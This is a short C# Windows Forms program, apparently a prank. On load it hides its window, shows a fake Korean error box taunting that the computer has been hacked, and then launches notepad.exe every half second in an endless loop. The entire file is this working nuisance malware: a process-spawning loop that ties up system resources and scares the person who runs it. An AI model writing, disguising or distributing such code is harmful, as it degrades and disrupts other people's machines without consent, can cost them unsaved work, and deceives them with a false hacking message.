using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Hide();
            MessageBox.Show("헤헿 니컴 해킹 ㅅㄱ", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
            while (true)
            {
                Process.Start("notepad.exe");
                Thread.Sleep(500);
            }
        }
    }
}
